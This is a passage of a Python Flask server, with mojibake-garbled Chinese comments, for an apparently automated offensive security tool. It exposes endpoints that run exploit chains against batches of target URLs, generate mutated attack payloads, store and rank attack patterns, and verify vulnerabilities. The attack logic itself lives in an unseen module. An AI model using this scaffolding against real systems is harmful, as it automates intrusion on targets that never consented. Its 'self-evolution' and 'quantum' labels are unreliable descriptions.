        for idx, target in enumerate(targets):
            try:
                # é¢„å¤„ç†ç›®æ ‡
                target_clean = preprocess_text(str(target))
                # è¶…é•¿urlåˆ†ç‰‡ï¼ˆæç«¯åœºæ™¯ï¼‰
                if len(target_clean) > 2000:
                    chunks = [target_clean[i:i+2000] for i in range(0, len(target_clean), 2000)]
                    chunk_results = []
                    for cidx, chunk in enumerate(chunks):
                        d = dict(data)
                        d['target_url'] = chunk
                        cres = brain_api.exploit_chain_operations(operation, d)
                        chunk_results.append({
                            'chunk_index': cidx,
                            'chunk_length': len(chunk),
                            'result': cres
                        })
                    # èšåˆåˆ†ç‰‡
                    main_result = chunk_results[0]['result'] if chunk_results else {}
                    results.append({
                        'index': idx,
                        'target_head': target_clean[:50],
                        'target_tail': target_clean[-50:],
                        'chunk_count': len(chunk_results),
                        'chunks': chunk_results,
                        'aggregation': {
                            'main_exploit_chain': main_result.get('exploit_chain', []),
                            'risk_score_max': max((c['result'].get('risk_score', 0) for c in chunk_results), default=0)
                        }
                    })
                else:
                    d = dict(data)
                    d['target_url'] = target_clean
                    cres = brain_api.exploit_chain_operations(operation, d)
                    results.append({
                        'index': idx,
                        'target_head': target_clean[:50],
                        'target_tail': target_clean[-50:],
                        'result': cres
                    })
            except Exception as e:
                errors += 1
                logger.error(f"æ¼æ´åˆ©ç”¨é“¾ç›®æ ‡{idx}å¤„ç†å¼‚å¸¸: {e}ï¼Œæ‘˜è¦: {str(target)[:80]}")
                results.append({
                    'index': idx,
                    'target_head': str(target)[:50],
                    'target_tail': str(target)[-50:],
                    'error': str(e)
                })

        # èšåˆç»Ÿè®¡
        agg = {
            'operation': operation,
            'total_targets': len(targets),
            'success': len(targets) - errors,
            'failed': errors,
            'elapsed_ms': int((time.time() - start_time) * 1000),
            'aggregation_method': 'per-target+main_exploit_chain'
        }

        return jsonify({
            'status': 'success',
            'aggregation': agg,
            'results': results,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        logger.error(f"æ¼æ´åˆ©ç”¨é“¾é¡¶çº§é”™è¯¯: {e}")
        return jsonify({
            'error': 'æ¼æ´åˆ©ç”¨é“¾æ“ä½œå¤±è´¥',
            'message': str(e),
            'code': 'EXPLOIT_ERROR'
        }), 500


@app.route('/api/health', methods=['GET'])
def health_check():
    if brain_api is None: return jsonify({'status': 'initializing', 'message': 'ç³»ç»Ÿå¯åŠ¨ä¸­'}), 503
    try:
        health = brain_api.system_management('health')
        return jsonify({'status': 'success', 'data': health, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("å¥åº·æ£€æŸ¥é”™è¯¯: {}".format(e))
        return jsonify({'status': 'error', 'message': str(e), 'code': 'HEALTH_CHECK_ERROR'}), 500


@app.route('/api/status', methods=['GET'])
def status_check():
    if brain_api is None: return jsonify({'status': 'initializing', 'message': 'ç³»ç»Ÿå¯åŠ¨ä¸­'}), 503
    try:
        status = brain_api.system_management('status')
        return jsonify({'status': 'success', 'data': status, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("çŠ¶æ€æ£€æŸ¥é”™è¯¯: {}".format(e))
        return jsonify({'status': 'error', 'message': str(e), 'code': 'STATUS_CHECK_ERROR'}), 500


@app.route('/api/performance', methods=['GET'])
def performance_check():
    if brain_api is None: return jsonify({'status': 'initializing', 'message': 'ç³»ç»Ÿå¯åŠ¨ä¸­'}), 503
    try:
        metrics = brain_api.system_management('metrics')
        return jsonify({'status': 'success', 'data': metrics, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("æ€§èƒ½æ£€æŸ¥é”™è¯¯: {}".format(e))
        return jsonify({'status': 'error', 'message': str(e), 'code': 'PERFORMANCE_ERROR'}), 500


@app.route('/api/self-evolution', methods=['POST'])
def self_evolution():
    """è‡ªæˆ‘è¿›åŒ–æ“ä½œ"""
    try:
        if not request.is_json:
            logger.error(f"è‡ªæˆ‘è¿›åŒ–è¯·æ±‚ä¸æ˜¯JSONæ ¼å¼: headers={request.headers}, body={request.data}")
            return jsonify({'status': 'error', 'message': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400

        data = request.get_json(silent=True)
        if not data:
            logger.error(f"è‡ªæˆ‘è¿›åŒ–è¯·æ±‚ç¼ºå°‘JSONä½“: body={request.data}")
            return jsonify({'status': 'error', 'message': 'ç¼ºå°‘æˆ–æ— æ•ˆJSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        operation = data.get('operation', '')

        if operation == 'train':
            loss = brain_api.self_evolution_engine.learn_from_experience()
            return jsonify({'status': 'success', 'loss': loss, 'message': 'è®­ç»ƒå®Œæˆ'})

        elif operation == 'status':
            return jsonify({
                'status': 'success',
                'experience_count': len(brain_api.self_evolution_engine.experience_buffer),
                'evolution_steps': len(brain_api.self_evolution_engine.evolution_history)
            })

        else:
            return jsonify({'status': 'error', 'message': 'æœªçŸ¥æ“ä½œ', 'code': 'UNKNOWN_OP'}), 400

    except Exception as e:
        logger.error(f"è‡ªæˆ‘è¿›åŒ–é”™è¯¯: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/neuroplasticity', methods=['POST'])
def neuroplasticity():
    """
    é¡¶çº§ä¸“ä¸šç‰ˆç¥ç»å¯å¡‘æ€§æ“ä½œ
    - æ”¯æŒå•æ¡/å¤šæ¡ç»éªŒæ‰¹é‡å·©å›º
    - å¥å£®æ€§å¢å¼ºï¼Œè¯¦ç»†æ—¥å¿—
    - è¿”å›æ¯æ¡å¤„ç†ç»“æœä¸èšåˆç»Ÿè®¡
    """
    import time
    start_time = time.time()

    try:
        if not request.is_json:
            logger.error(f"ç¥ç»å¯å¡‘æ€§è¯·æ±‚ä¸æ˜¯JSONæ ¼å¼: headers={request.headers}, body={request.data}")
            return jsonify({'status': 'error', 'message': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400

        data = request.get_json(silent=True)
        if not data:
            logger.error(f"ç¥ç»å¯å¡‘æ€§è¯·æ±‚ç¼ºå°‘JSONä½“: body={request.data}")
            return jsonify({'status': 'error', 'message': 'ç¼ºå°‘æˆ–æ— æ•ˆJSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        # æ”¯æŒ experience ä¸ºå•æ¡æˆ–æ‰¹é‡
        experiences = data.get('experience', [])
        if isinstance(experiences, dict):
            experiences = [experiences]

        if not isinstance(experiences, list) or not experiences:
            return jsonify({'status': 'error', 'message': 'experienceå‚æ•°å¿…é¡»ä¸ºå¯¹è±¡æˆ–éç©ºæ•°ç»„', 'code': 'INVALID_EXPERIENCE'}), 400

        results = []
        successes = 0
        for idx, exp in enumerate(experiences):
            try:
                importance = brain_api.neuroplastic_learner.experience_consolidation(exp)
                brain_api.self_evolution_engine.record_experience(exp)
                results.append({
                    'index': idx,
                    'status': 'success',
                    'importance': importance,
                    'experience_type': exp.get('type', 'unknown')
                })
                successes += 1
            except Exception as e:
                logger.error(f"ç¥ç»å¯å¡‘æ€§å•æ¡å¤„ç†å¼‚å¸¸ idx={idx}: {e}")
                results.append({
                    'index': idx,
                    'status': 'error',
                    'message': str(e),
                    'experience_type': exp.get('type', 'unknown')
                })

        agg = {
            'total': len(experiences),
            'success': successes,
            'failed': len(experiences) - successes,
            'elapsed_ms': int((time.time() - start_time) * 1000)
        }

        return jsonify({
            'status': 'success',
            'aggregation': agg,
            'results': results,
            'message': 'æ‰¹é‡ç»éªŒå·²å·©å›º' if len(experiences) > 1 else 'ç»éªŒå·²å·©å›º'
        })
    except Exception as e:
        logger.error(f"ç¥ç»å¯å¡‘æ€§é”™è¯¯: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/creative-attacks', methods=['POST'])
def creative_attacks():
    """
    é¡¶çº§ä¸“ä¸šç‰ˆåˆ›é€ æ€§æ”»å‡»ç”Ÿæˆ
    - æ”¯æŒå¤šç±»å‹æ‰¹é‡ç”Ÿæˆ
    - å¥å£®æ€§å¢å¼ºï¼Œè¯¦ç»†æ—¥å¿—ä¸æ€§èƒ½ç»Ÿè®¡
    - æ¯æ¡payloadå«è¯¦ç»†æº¯æºä¸é£é™©è¯„ä¼°
    """
    import time
    start_time = time.time()
    try:
        if not request.is_json:
            logger.error(f"åˆ›é€ æ€§æ”»å‡»è¯·æ±‚ä¸æ˜¯JSON: headers={request.headers}, body={request.data}")
            return jsonify({'status': 'error', 'message': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400

        data = request.get_json(silent=True)
        if not data:
            logger.error(f"åˆ›é€ æ€§æ”»å‡»ç¼ºå°‘JSONä½“: body={request.data}")
            return jsonify({'status': 'error', 'message': 'ç¼ºå°‘æˆ–æ— æ•ˆJSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        # å¤šç±»å‹æ”¯æŒ
        base_payload = data.get('base_payload', '')
        attack_types = data.get('attack_types') or [data.get('attack_type', 'sql_injection')]
        count = int(data.get('count', 5))
        if isinstance(attack_types, str):
            attack_types = [attack_types]

        if not base_payload or not isinstance(base_payload, str):
            return jsonify({'status': 'error', 'message': 'base_payloadä¸ºå¿…å¡«å­—ç¬¦ä¸²', 'code': 'MISSING_BASE'}), 400
        if count < 1 or count > 100:
            return jsonify({'status': 'error', 'message': 'countå‚æ•°èŒƒå›´1-100', 'code': 'INVALID_COUNT'}), 400

        logger.info(f"æ‰¹é‡ç”Ÿæˆåˆ›é€ æ€§æ”»å‡»: base={base_payload}, types={attack_types}, count={count}")

        all_attacks = []
        errors = 0
        for atype in attack_types:
            try:
                attacks = brain_api.creative_attacker.generate_attack_series(
                    base_payload, count, atype
                )
                # å¢åŠ è¯¦ç»†æº¯æºä¿¡æ¯
                for attack in attacks:
                    attack['attack_type'] = atype
                    attack['base_payload'] = base_payload
                all_attacks.extend(attacks)
            except Exception as e:
                logger.error(f"ç”Ÿæˆç±»å‹{atype}å¤±è´¥: {e}")
                all_attacks.append({
                    'attack_type': atype,
                    'base_payload': base_payload,
                    'error': str(e)
                })
                errors += 1

        elapsed = int((time.time() - start_time) * 1000)
        logger.info(f"ç”Ÿæˆå®Œæˆ: {len(all_attacks)} ä¸ªpayloadï¼Œå¤±è´¥{errors}ç§ç±»å‹")

        return jsonify({
            'status': 'success',
            'attacks': all_attacks,
            'aggregation': {
                'total_generated': len(all_attacks),
                'attack_types': attack_types,
                'base_payload': base_payload,
                'errors': errors,
                'elapsed_ms': elapsed
            }
        })
    except Exception as e:
        logger.error(f"åˆ›é€ æ€§æ”»å‡»é¡¶çº§é”™è¯¯: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/knowledge/patterns', methods=['POST'])
def knowledge_patterns():
    """å®Œå…¨é‡å†™çš„çŸ¥è¯†æ¨¡å¼APIï¼Œå¸¦æœ‰è¯¦ç»†é”™è¯¯å¤„ç†"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'ç¼ºå°‘JSONæ•°æ®'}), 400

        operation = data.get('operation', '')
        logger.info(f"çŸ¥è¯†æ¨¡å¼æ“ä½œ: {operation}")

        if operation == 'store':
            # å­˜å‚¨æ“ä½œ
            pattern_type = data.get('pattern_type', 'sql_injection')
            pattern_data = data.get('pattern_data', '')
            effectiveness = data.get('effectiveness', 0.8)

            pattern_id = brain_api.enhanced_knowledge_manager.store_attack_pattern(
                pattern_type, pattern_data, effectiveness
            )

            if pattern_id:
                return jsonify({
                    'status': 'success',
                    'pattern_id': pattern_id,
                    'message': 'æ¨¡å¼å­˜å‚¨æˆåŠŸ'
                })
            else:
                return jsonify({'status': 'error', 'message': 'æ¨¡å¼å­˜å‚¨å¤±è´¥'})

        elif operation == 'retrieve':
            # æ£€ç´¢æ“ä½œ
            pattern_type = data.get('pattern_type')
            min_effectiveness = float(data.get('min_effectiveness', 0.6))
            limit = int(data.get('limit', 10))

            patterns = brain_api.enhanced_knowledge_manager.retrieve_attack_patterns(
                pattern_type, min_effectiveness, limit
            )

            return jsonify({
                'status': 'success',
                'patterns': patterns,
                'count': len(patterns)
            })

        elif operation == 'find_similar':
            return handle_find_similar(data)

        elif operation == 'stats':
            # ç»Ÿè®¡æ“ä½œ
            stats = brain_api.enhanced_knowledge_manager.debug_database()
            return jsonify({'status': 'success', 'stats': stats})

        else:
            return jsonify({'status': 'error', 'message': 'æœªçŸ¥æ“ä½œ'}), 400

    except Exception as e:
        logger.error(f"çŸ¥è¯†æ¨¡å¼APIé”™è¯¯: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'å†…éƒ¨æœåŠ¡å™¨é”™è¯¯'}), 500


def handle_find_similar(data):
    """ä¸“é—¨å¤„ç†ç›¸ä¼¼åº¦æŸ¥æ‰¾"""
    try:
        query_pattern = data.get('query_pattern', '')
        similarity_threshold = float(data.get('similarity_threshold', 0.6))

        logger.info(f"æŸ¥æ‰¾ç›¸ä¼¼æ¨¡å¼: {query_pattern}, é˜ˆå€¼: {similarity_threshold}")

        # ä½¿ç”¨å®‰å…¨çš„ç›¸ä¼¼åº¦è®¡ç®—
        similar_patterns = brain_api.enhanced_knowledge_manager.safe_find_similar(
            query_pattern, similarity_threshold
        )

        return jsonify({
            'status': 'success',
            'similar_patterns': similar_patterns,
            'query_pattern': query_pattern,
            'threshold': similarity_threshold
        })

    except Exception as e:
        logger.error(f"ç›¸ä¼¼åº¦æŸ¥æ‰¾é”™è¯¯: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': f'ç›¸ä¼¼åº¦è®¡ç®—å¤±è´¥: {str(e)}'}), 500


# ==================== æ–°å¢APIç«¯ç‚¹ ====================
@app.route('/api/quantum-analysis', methods=['POST'])
def quantum_analysis():
    """
    é¡¶çº§ä¸“ä¸šé‡å­åˆ†ææ¥å£
    - æ”¯æŒtextã€data_inputç­‰ç»“æ„åŒ–å’Œæ‰¹é‡
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–'}), 503

    try:
        if not request.is_json:
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400
        data = request.get_json(silent=True)
        # 1. æ”¯æŒåŸtext
        if 'text' in data and data['text']:
            targets = data['text'] if isinstance(data['text'], list) else [data['text']]
        # 2. æ”¯æŒç»“æ„åŒ–data_input
        elif 'data_input' in data and data['data_input']:
            targets = [data['data_input']]
        else:
            return jsonify({'error': 'ç¼ºå°‘åˆ†æç›®æ ‡(text/data_input)', 'code': 'MISSING_INPUT'}), 400
        results = []
        errors = 0
        for idx, target in enumerate(targets):
            try:
                res = brain_api.quantum_enhanced_analysis(target)
                results.append({
                    "index": idx,
                    "input_type": type(target).__name__,
                    "result": res
                })
            except Exception as e:
                errors += 1
                results.append({
                    "index": idx,
                    "input_type": type(target).__name__,
                    "error": str(e)
                })
        agg = {
            'total': len(targets),
            'success': len(targets) - errors,
            'failed': errors,
            'elapsed_ms': int((time.time() - start_time) * 1000)
        }
        return jsonify({
            'status': 'success',
            'results': results,
            'aggregation': agg,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        logger.error(f"é‡å­åˆ†æé”™è¯¯: {e}")
        return jsonify({'error': 'é‡å­åˆ†æå¤±è´¥', 'message': str(e)}), 500


@app.route('/api/multimodal-analysis', methods=['POST'])
def multimodal_analysis():
    """
    é¡¶çº§å¤šæ¨¡æ€åˆ†ææ¥å£
    - æ”¯æŒmodalitiesæ•°ç»„ã€textã€dataç­‰å¤šç§è¾“å…¥
    - è‡ªåŠ¨èšåˆåˆ†æï¼Œå¤šæ¨¡æ€ç›¸å…³æ€§
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–'}), 503

    try:
        if not request.is_json:
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400

        data = request.get_json(silent=True)
        # å…¼å®¹å¤šæ¨¡æ€ã€å•textã€data
        modalities = data.get('modalities')
        if modalities and isinstance(modalities, list):
            modal_results = []
            errors = 0
            for idx, modal in enumerate(modalities):
                try:
                    mtype = modal.get('type', 'unknown')
                    mcontent = modal.get('content', '')
                    analysis_type = modal.get('analysis_type', '')
                    result = brain_api.multimodal_analyzer.analyze({
                        "type": mtype,
                        "content": mcontent,
                        "analysis_type": analysis_type
                    })
                    modal_results.append({
                        'index': idx,
                        'type': mtype,
                        'analysis_type': analysis_type,
                        'result': result
                    })
                except Exception as e:
                    errors += 1
                    modal_results.append({
                        'index': idx,
                        'type': modal.get("type", "unknown"),
                        'error': str(e)
                    })
            # ç›¸å…³æ€§åˆ†æ
            correlation = None
            if data.get("correlation_analysis"):
                try:
                    correlation = brain_api.multimodal_analyzer.correlation(modalities)
                except Exception as e:
                    correlation = {"error": str(e)}
            agg = {
                'total_modals': len(modalities),
                'success': len(modalities) - errors,
                'failed': errors,
                'elapsed_ms': int((time.time() - start_time) * 1000)
            }
            return jsonify({
                'status': 'success',
                'results': modal_results,
                'correlation': correlation,
                'aggregation': agg,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            })
        # å…¼å®¹è€text/dataå­—æ®µ
        input_data = data.get('text') or data.get('data')
        if input_data:
            result = brain_api.multimodal_analyzer.analyze(input_data)
            return jsonify({
                'status': 'success',
                'data': result,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            })
        return jsonify({'error': 'ç¼ºå°‘è¾“å…¥æ•°æ®', 'code': 'NO_INPUT'}), 400
    except Exception as e:
        logger.error(f"å¤šæ¨¡æ€åˆ†æé”™è¯¯: {e}")
        return jsonify({'error': 'å¤šæ¨¡æ€åˆ†æå¤±è´¥', 'message': str(e)}), 500




@app.route('/api/system/repair', methods=['POST'])
def system_repair():
    """è§¦å‘ç³»ç»Ÿè‡ªæˆ‘ä¿®å¤"""
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–'}), 503

    try:
        repair_report = brain_api.perform_self_repair()
        return jsonify({
            'status': 'success',
            'repair_report': repair_report,
            'timestamp': datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"è‡ªæˆ‘ä¿®å¤é”™è¯¯: {e}")
        return jsonify({'error': 'è‡ªæˆ‘ä¿®å¤å¤±è´¥', 'message': str(e)}), 500
		
		
		
# ========== æ–°å¢APIç«¯ç‚¹ ==========
@app.route('/api/evidence/collect', methods=['POST'])
def evidence_collect():
    """
    é¡¶çº§ä¸“ä¸šè¯æ®é‡‡é›†æ¥å£
    - æ”¯æŒtarget_urlã€urlã€targetç­‰å¤šå­—æ®µï¼Œå…¼å®¹ç»“æ„åŒ–
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–'}), 503
    try:
        if not request.is_json:
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400
        data = request.get_json(silent=True)
        url = data.get('target_url') or data.get('url') or data.get('target')
        if not url:
            return jsonify({'status': 'error', 'message': 'Missing url/target', 'code': 'MISSING_TARGET'}), 400
        res = brain_api.evidence_engine.collect(data)
        return jsonify({
            'status': 'success',
            'result': res,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        logger.error(f"è¯æ®é‡‡é›†é”™è¯¯: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/vuln/verify', methods=['POST'])
def vuln_verify():
    """
    é¡¶çº§ä¸“ä¸šæ¼æ´éªŒè¯æ¥å£
    - æ”¯æŒtarget_urlã€urlã€targetç­‰å¤šå­—æ®µ
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–'}), 503
    try:
        if not request.is_json:
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400
        data = request.get_json(silent=True)
        url = data.get('target_url') or data.get('url') or data.get('target')
        if not url:
            return jsonify({'status': 'error', 'message': 'Missing url/target', 'code': 'MISSING_TARGET'}), 400
        res = brain_api.verify_engine.verify(data)
        return jsonify({
            'status': 'success',
            'result': res,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        logger.error(f"æ¼æ´éªŒè¯é”™è¯¯: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/autotest', methods=['POST'])
def autotest_endpoint():
    """
    é¡¶çº§ä¸“ä¸šè‡ªåŠ¨åŒ–æµ‹è¯•æ¥å£
    - æ”¯æŒtarget_urlã€urlã€targetã€targetså„ç§å­—æ®µ
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–'}), 503

    try:
        if not request.is_json:
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400
        data = request.get_json(silent=True)
        # å…¼å®¹å¤šç§ç›®æ ‡å­—æ®µ
        target = data.get('target_url') or data.get('url') or data.get('target')
        targets = data.get('targets') or ([target] if target else [])
        if isinstance(targets, str):
            targets = [targets]
        targets = [t for t in targets if t]
        if not targets:
            return jsonify({'status': 'error', 'message': 'Missing url/target', 'code': 'MISSING_TARGET'}), 400
        # å…¶ä»–å‚æ•°æŒ‰éœ€ä¼ é€’
        results = []
        for idx, t in enumerate(targets):
            d = dict(data)
            d['target_url'] = t
            res = brain_api.autotest_engine.run(d)
            results.append({'index': idx, 'target': t, 'result': res})
        agg = {
            'total_targets': len(targets),
            'elapsed_ms': int((time.time() - start_time) * 1000)
        }
        return jsonify({
            'status': 'success',
            'results': results,
            'aggregation': agg,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        logger.error(f"è‡ªåŠ¨åŒ–æµ‹è¯•é”™è¯¯: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== ä¸»ç¨‹åºå…¥å£ ====================
if __name__ == '__main__':
    # é¢„å…ˆåˆå§‹åŒ–
    initialize_brain_api()

    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        threaded=True
    )